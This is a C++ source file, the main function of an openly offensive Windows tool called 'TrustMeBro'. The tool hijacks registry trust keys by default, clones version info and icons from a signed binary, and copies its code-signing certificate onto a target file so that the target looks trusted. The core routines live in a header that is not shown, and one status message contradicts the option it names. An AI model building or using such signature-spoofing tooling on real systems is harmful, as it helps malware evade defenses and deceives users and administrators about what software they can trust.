#include "steal.h"
#include <cstring>

void print_usage(char* argv0) {
    std::fprintf(stderr, "Usage: %s [options] <signed_src> <target>\n", argv0);
    std::fprintf(stderr, "Options:\n");
    std::fprintf(stderr, "  -v, --verbose    Enable verbose output\n");
    std::fprintf(stderr, "  -c, --clean      Restore registry keys to default (remove hijack)\n");
    std::fprintf(stderr, "  --clone          Clone metadata (Version Info, Icon) from source to target\n");
    std::fprintf(stderr, "  --no-hijack      Disable Registry Hijacking (Default: Hijacking Enabled)\n");
    std::fprintf(stderr, "  -h, --help       Show this help message\n");
}

int main(int argc, char* argv[]) {
    bool clean_mode = false;
    bool clone_mode = false;
    bool hijack_mode = true; // Default to true
    std::string src, dst;
    
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
            g_verbose = true;
        } else if (strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--clean") == 0) {
            clean_mode = true;
        } else if (strcmp(argv[i], "--clone") == 0) {
            clone_mode = true;
        } else if (strcmp(argv[i], "--no-hijack") == 0) {
            hijack_mode = false;
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_usage(argv[0]);
            return EXIT_SUCCESS;
        } else {
            if (src.empty()) src = argv[i];
            else if (dst.empty()) dst = argv[i];
        }
    }

    if (clean_mode) {
        if (cleanup_registry()) {
            std::cout << "[+] Registry cleanup successful." << std::endl;
            std::cout << "[!] Note: You may need to log out and log back in for changes to take effect." << std::endl;
            return EXIT_SUCCESS;
        } else {
            std::cerr << "[-] Registry cleanup failed." << std::endl;

            return EXIT_FAILURE;
        }
    }

    if (src.empty() || dst.empty()) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    if (g_verbose) std::cout << "[*] Starting TrustMeBro..." << std::endl;

    if (hijack_mode) {
        if (!hook_registry()) {
            std::cerr << "[-] Failed to hijack registry keys." << std::endl;
            return EXIT_FAILURE;
        }
        if (g_verbose) std::cout << "[+] Registry hijacked successfully." << std::endl;
        std::cout << "[!] Note: You may need to log out and log back in for changes to take effect." << std::endl;
    } else {
        if (g_verbose) std::cout << "[*] Skipping Registry Hijack (use --no-hijack to disable)." << std::endl;
    }

    if (clone_mode) {
        if (!clone_metadata(src, dst)) {
            std::cerr << "[-] Failed to clone metadata from \"" << src << "\" to \"" << dst << "\"" << std::endl;
            return EXIT_FAILURE;
        }
    }

    if (!steal(src, dst)) {
        std::fprintf(stderr, "[-] Failed to steal certificate from \"%s\" to \"%s\"\n", src.c_str(), dst.c_str());

        return EXIT_FAILURE;
    }

    std::printf("[+] Certificate successfully copied from \"%s\" to \"%s\"\n", src.c_str(), dst.c_str());
    return EXIT_SUCCESS;
}
